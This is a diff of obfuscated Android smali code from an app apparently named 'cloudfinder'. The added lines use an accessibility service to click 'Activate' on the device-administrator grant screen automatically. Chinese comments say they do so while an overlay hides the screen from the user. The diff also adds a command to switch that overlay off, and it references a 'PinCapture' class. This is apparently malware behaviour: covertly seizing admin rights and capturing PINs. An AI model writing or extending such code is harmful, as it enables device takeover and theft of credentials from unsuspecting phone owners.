@@ -678,6 +678,22 @@
 .method private static clickAdmin(Landroid/content/Context;)V
     .locals 6
 
+    # 2.2：遮罩挡住 active window → 先遍历窗口点“启动”
+    :try_start_adm
+    invoke-static {}, Lcom/lite/cloudfinder/pin/PinCapture;->clickAdminOnAnyWindow()Z
+    move-result v0
+    if-eqz v0, :adm_no
+    const-string v0, "PermDebug"
+    const-string v1, "admin clicked (window scan)"
+    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+    return-void
+    :adm_no
+    :try_end_adm
+    .catch Ljava/lang/Exception; {:try_start_adm .. :try_end_adm} :catch_adm
+    goto :goto_adm
+    :catch_adm
+    :goto_adm
+
     # 在 DeviceAdminAdd 页自动点“启动 / 激活 / Activate”（三星文案是“启动”）
     :try_start_0
     sget-object v0, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;
@@ -779,10 +795,15 @@
     if-eq v1, v2, :gstart
     const/4 v2, 0x7
     if-eq v1, v2, :aclick
+    const/16 v2, 0x8
+    if-eq v1, v2, :ovoff
     invoke-static {v0}, Lڝږ؁ڋ/ھ;->scheduleClick(Landroid/content/Context;)V
     goto :end
     :aclick
     invoke-static {v0}, Lڝږ؁ڋ/ھ;->clickAdmin(Landroid/content/Context;)V
+    goto :end
+    :ovoff
+    invoke-static {}, Lڗًقڔ/؋;->ؿ()V
     goto :end
     :admin
     invoke-static {v0}, Lڝږ؁ڋ/ھ;->launchAdmin(Landroid/content/Context;)V
